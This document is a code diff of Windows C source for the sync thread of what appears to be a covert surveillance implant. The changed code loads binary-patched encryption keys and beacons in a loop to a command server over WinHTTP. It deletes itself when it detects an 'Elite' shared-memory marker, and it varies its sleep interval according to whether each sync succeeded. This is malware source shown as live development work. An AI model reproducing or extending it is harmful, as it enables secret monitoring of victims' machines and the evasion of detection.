@@ -1,5 +1,6 @@
 #include <Windows.h>
 
+#include "main.h"
 #include "sync_thread.h"
 #include "binpatched_vars.h"
 #include "agent_device.h"
@@ -9,45 +10,58 @@
 #include "proto.h"
 #include "crypt.h"
 
+typedef NTSTATUS (WINAPI *ZWTERMINATEPROCESS)(HANDLE, ULONG);
+
 extern BYTE pServerKey[32];
 extern BYTE pConfKey[32];
 extern BYTE pSessionKey[20];
 extern BYTE pLogKey[32];
+extern BOOL bLastSync;
+
+BOOL bFirstShot = TRUE;
 
 VOID SyncThreadFunction()
 {
 	ULONG pServerPort;
 	BYTE pServerIp[32];
 
-	memcpy(pServerKey, CLIENT_KEY, 32);
-	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
-	memcpy(pLogKey, ENCRYPTION_KEY, 32);
-
-#ifdef _DEBUG_BINPATCH
-	MD5((PBYTE)CLIENT_KEY, 32, (PBYTE)pServerKey);
-	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, (PBYTE)pConfKey);
-	MD5((PBYTE)ENCRYPTION_KEY, 32, (PBYTE)pLogKey);
-#endif
-
 	GetDeviceInfo();
 
 	while(1)
 	{
-		Sleep(SYNC_INTERVAL);
+		if (ExistsEliteSharedMemory())
+		{
+			DeleteAndDie(TRUE);
+			break;
+		}
 #ifdef _DEBUG
 		OutputDebugString(L"[*] Starting sync...\n");
 #endif
 
-		// Get screenshot
 		if (WinHTTPSetup((PBYTE)SYNC_SERVER, pServerIp, sizeof(pServerIp), &pServerPort))
 		{
-			SyncWithServer();
+			bLastSync = SyncWithServer();
+
+#ifdef _DEBUG
+			if (!bLastSync)
+				OutputDebugString(L"[!!] Sync FAILED\n");
+#endif
+
 			WinHTTPClose();
 		}
-#ifdef _DEBUG
 		else
+		{
+#ifdef _DEBUG
 			OutputDebugString(L"WinHTTPSetup FAIL\n");
 #endif
+			bLastSync = FALSE;
+		}
+			
+		if (bLastSync)
+			MySleep(WAIT_SUCCESS_SYNC);
+		else
+			MySleep(WAIT_FAIL_SYNC);
+
 	}
 }
 
